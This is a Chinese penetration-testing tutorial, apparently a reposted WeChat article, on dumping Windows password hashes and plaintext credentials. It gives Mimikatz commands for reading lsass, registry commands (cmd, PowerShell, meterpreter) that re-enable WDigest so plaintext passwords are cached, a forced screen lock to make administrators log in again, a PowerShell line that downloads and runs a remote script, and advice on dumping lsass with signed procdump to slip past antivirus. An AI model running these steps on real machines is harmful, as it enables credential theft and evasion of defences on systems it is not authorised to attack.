> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/YR_6WwnX_zs7vfyYsjMFqQ)

在 Windows2000 以后，Windows 机器都用 NTLM 算法在本地保存用户的密码，密码的 NTLM 哈希保存在`%SystemRoot%\System32\config\SAM`文件中。

Windows 操作系统通常使用两种方法对用户的密码进行哈希处理，即 LAN Manager（LM）哈希和 NT LAN Manager（NTLM）哈希。所谓哈希（Hash），即使用一种加密方法对明文密码进行加密，对一个任意长度的字符串数据进行一次加密运算，都可以返回一个固定长度的字符串。

Windows 加密过的密码口令，我们称之为 Hash。

Windows 操作系统中的密码一般由两部分组成：一部分为 LM Hash，另一部分为 NTLM Hash。在 Windows 中，Hash 的结构通常如下：

Username:RID:LM-Hash:NT-Hash   

在 Windows2000 以后的系统中，第一部分的 LM-hash 都是空值，因为 LM-hash 可以很容易的破解，所以 Windows2000 之后这个值默认为空，所以第二部分的 NTLM-hash 才真正是用户密码的哈希值。

在渗透测试中，通常可从 Windows 系统中的 SAM 文件和域控的 NTDS.dit 文件（在域环境中，用户信息存储在 NTDS.dit 中）中获得所有用户的 Hash。也可以通过 Mimikatz 读取 lsass.exe 进程获得已登录用户的 NTLM hash 和明文值 。

> 注：但是在安装了 KB2871997 补丁或者系统版本大于 Windows10 或 Windows Server 2012 时，默认在内存缓存中禁止保存明文密码，这样利用 mimikatz 就不能从内存中读出明文密码了，但可以通过修改注册表的方式抓取明文。

在 KB2871997 之前， Mimikatz 可以直接抓取明文密码。

当服务器安装 KB2871997 补丁后，系统默认禁用 `Wdigest Auth` ，内存（lsass 进程）不再保存明文口令。Mimikatz 将读不到密码明文。  
但由于一些系统服务需要用到 Wdigest Auth，所以该选项是可以手动开启的。（开启后，需要用户重新登录才能生效）

以下是支持的系统:

Windows 7  
Windows 8  
Windows 8.1  
Windows Server 2008  
Windows Server 2012  
Windows Server 2012R 2

什么是 Wdigest Auth,

  
WDigest.dll 是在 Windows XP 操作系统中引入的。摘要认证协议设计用于超文本传输协议（HTTP）和简单认证安全层（SASL）交换，如 RFC 2617 和 2831 中所述。

许多人认为 Digest 认证是一种与 Web 浏览器一起使用以验证浏览 Internet 的用户的协议。

然而，Digest 认证也是可以用于认证的通用协议，并且通过使用 SASL，它可以提供完整性保护。例如，您可以使用摘要身份验证：

经过身份验证的客户端访问网站  
使用 SASL 进行身份验证客户端访问  
使用 LDAP 对目录服务进行身份验证的身份验证客户端访问

WDigest 的问题是它将密码存储在内存中，并且无论是否使用它，都会将其存储在内存中。除非密码以明文保存在内存中，否则 WDigest 无法正常工作，因此如果使用 WDigest，则无法进行修复。

以下操作系统受到影响：

Windows 7，Windows 8，Windows 8.1，Windows Server 2008，Windows Server 2008R2 和 Windows Server 2012。

Mimikatz 读取明文密码和 hash 也是最常用的方法。需要管理员权限。

```
privilege::debug // 提升至debug权限
sekurlsa::logonpasswords // 抓取密码
```

  
这里以 Windows Server 2012 为例：

  
没有开启 Wdigest Auth 无法获取明文。

![](https://mmbiz.qpic.cn/mmbiz_png/J8eMAibvuV2JTtekDO3spHxulOgf6tWuASAPxsWM87MXW1m0MrwElfq9yibKLa72wgLWBQza4PR492yWu9ThIZ2Q/640?wx_fmt=png)

解决办法：手动通过修改注册表开启`Wdigest Auth`

cmd:

```
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f
```

powershell:

```
Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest -Name UseLogonCredential -Type DWORD -Value 1
```

meterpreter:

```
reg setval -k HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest -v UseLogonCredential -t REG_DWORD -d 1
```

关闭 (1 改为 0)

cmd

```
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 0 /f
```

powershell

```
Set-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest -Name UseLogonCredential -Type DWORD -Value 0
```

meterpreter

```
reg setval -k HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest -v UseLogonCredential -t REG_DWORD -d 0
```

在开启 `Wdigest Auth` 后，需要管理员重新登录才能抓取明文密码。

我们可以强制锁屏，让管理员重新登录。

cmd

```
rundll32 user32.dll,LockWorkStation
```

powershell

```
powershell -c "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/kiraly15/Lock-WorkStation/master/Lock-WorkStation.ps1');"
```

![](https://mmbiz.qpic.cn/mmbiz_png/J8eMAibvuV2JTtekDO3spHxulOgf6tWuA0a9ThM66CVdkdmHgs3R2ulBKlFaFa8ic1A0OKbcicVA3nEnB2ytLHIiaQ/640?wx_fmt=png)

成功抓取到明文密码。

离线抓取 Windows 明文密码
-----------------

当 mimikatz 无法实现免杀时，我们可以 dump lsass 进程，然后离线读取。

使用微软的工具套件，procdump，带微软签名，可绕过一些杀软。

![](https://mmbiz.qpic.cn/mmbiz_png/J8eMAibvuV2JTtekDO3spHxulOgf6tWuAVSGicGedBhUzhK4Ekicnsrth01ZpLgF1Me7MibBQzX22CTfqRnO7cDibZA/640?wx_fmt=png)

mimikatz 读取  
将导出的 lsass.dmp 放在 mimikataz.exe 同一个目录下。

![](https://mmbiz.qpic.cn/mmbiz_png/J8eMAibvuV2JTtekDO3spHxulOgf6tWuAUbwibNeibKRr9zdEAtJgT3Wswj7zrNIbWwxgDMCZibaic69KZ8ON0aU8bg/640?wx_fmt=png)

成功离线读取。

问题
--

1. 留下个问题，下次解决。Windows10 这种情况，如何抓密码？

![](https://mmbiz.qpic.cn/mmbiz_png/J8eMAibvuV2JTtekDO3spHxulOgf6tWuAciaicJ5XWAr4PdSCwHXGWbkdO2cN4e9JIR2BBuuYg7YwYNkq6d4riaDJA/640?wx_fmt=png)

2. Windows 10 和 其他版本，手动开启 Wdigest Auth 后，是不是只需要锁屏就可以抓明文了？

参考资料：  
https://jayl1n.github.io/2019/03/29/pentest-getpassword/  
https://wooyun.js.org/drops/%E5%9F%9F%E6%B8%97%E9%80%8F%E2%80%94%E2%80%94Dump%20Clear-Text%20Password%20after%20KB2871997%20installed.html  
https://zhuanlan.zhihu.com/p/30400059  
http://www.feidao.site/wordpress/?p=1993